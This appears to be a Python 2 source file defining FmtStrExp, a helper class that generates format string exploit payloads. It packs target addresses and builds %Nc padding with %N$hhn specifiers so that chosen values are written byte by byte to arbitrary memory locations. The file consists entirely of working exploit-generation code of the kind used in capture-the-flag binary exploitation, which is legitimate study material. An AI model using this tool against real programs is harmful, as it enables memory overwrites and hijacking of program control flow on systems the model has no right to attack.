import struct

p32 = lambda x : struct.pack('<L', x)
p64 = lambda x : struct.pack('<Q', x)

class FmtStrExp:
    printed = 0
    table = {
        32 : [p32, 4],
        64 : [p64, 6]
    }

    def __init__(self, printed=0, hij_tar=None, hij_val=None):
        self.hijack_target = hij_tar
        self.hijack_value = hij_val
        FmtStrExp.printed += printed
        
    @staticmethod
    def sort_multi_target(fmt_tuple, bits):
        '''Arrange value per byte for optimization'''
        final_fmt = []
        for fmt in fmt_tuple:
            final_fmt += [(fmt[0].hijack_target + i, (fmt[0].hijack_value >> 8 * i) & 0xff) for i in xrange(fmt[1])]
        return sorted(final_fmt, key=lambda x : (x[1] - FmtStrExp.table[bits][1] * len(final_fmt)) & 0xff)
        
    @classmethod
    def generate_target(cls, total_fmt, bits):
        payload = ''.join(cls.table[bits][0](i[0]) for i in total_fmt)
        cls.printed += cls.table[bits][1] * len(total_fmt)
        return payload

    @classmethod
    def generate_fmt(cls, total_fmt, offset):
        total_fmt = map(lambda x : x[1], total_fmt)
        payload = ''
        for idx, byte in enumerate(total_fmt):
            pad = ((byte - cls.printed) % 256 + 256) % 256
            if pad > 0:
                payload += "%{}c".format(pad)
            payload += "%{}$hhn".format(offset + idx)
            cls.printed += pad
        return payload

    @classmethod
    def generate32(cls, fmt_tuple, off):
        
        # Setup efficient order of hijack target
        total_fmt = FmtStrExp.sort_multi_target(fmt_tuple, 32)

        # Generate payload
        payload = FmtStrExp.generate_target(total_fmt, 32)
        payload += FmtStrExp.generate_fmt(total_fmt, off)
        return payload

    @classmethod
    def size(cls):
        '''Return already printed words'''
        return cls.printed
